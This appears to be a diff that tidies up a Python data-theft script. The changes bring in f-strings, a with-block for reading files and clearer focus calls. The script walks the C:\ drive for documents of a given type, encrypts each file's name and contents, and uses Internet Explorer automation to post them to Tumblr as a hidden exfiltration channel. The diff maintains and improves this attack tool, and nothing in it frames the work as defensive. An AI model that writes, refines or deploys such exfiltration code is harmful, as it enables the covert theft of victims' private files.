@@ -26,7 +26,7 @@ YLZuR2u5KUbr9uabEzgtrLyOeoK8UscKmzOvtwxZDcgNijqMJKuqpNZczPHmf9cS
 
 def wait_for_browser(browser):
     # wait for the browser to finish loading a page
-    while browser.ReadyState != 4 and browser.ReadyState != "complete":
+    while browser.ReadyState not in [4, "complete"]:
         time.sleep(0.1)
     return
 
@@ -57,11 +57,8 @@ def encrypt_string(plaintext):
 
 
 def encrypt_post(filename):
-    # open and read the file
-    fd = open(filename, "rb")
-    contents = fd.read()
-    fd.close()
-
+    with open(filename, "rb") as fd:
+        contents = fd.read()
     encrypted_title = encrypt_string(filename)
     encrypted_body = encrypt_string(contents)
 
@@ -109,7 +106,7 @@ def post_to_tumblr(ie, title, post):
         if i.id == "post_one":
             i.setAttribute("value", title)
             title_box = i
-            i.focus()
+            title_box.focus()
         elif i.id == "post_two":
             i.setAttribute("innerHTML", post)
             print("Set text area")
@@ -117,8 +114,7 @@ def post_to_tumblr(ie, title, post):
         elif i.id == "create_post":
             print("Found post button")
             post_form = i
-            i.focus()
-
+            post_form.focus()
     # move focus away from the main content box        
     random_sleep()
     title_box.focus()
@@ -163,8 +159,8 @@ def exfiltrate(document_path):
 
 # main loop for document discovery
 for parent, directories, filenames in os.walk("C:\\"):
-    for filename in fnmatch.filter(filenames, "*%s" % doc_type):
+    for filename in fnmatch.filter(filenames, f"*{doc_type}"):
         document_path = os.path.join(parent, filename)
-        print("Found: %s" % document_path)
+        print(f"Found: {document_path}")
         exfiltrate(document_path)
         input("Continue?")
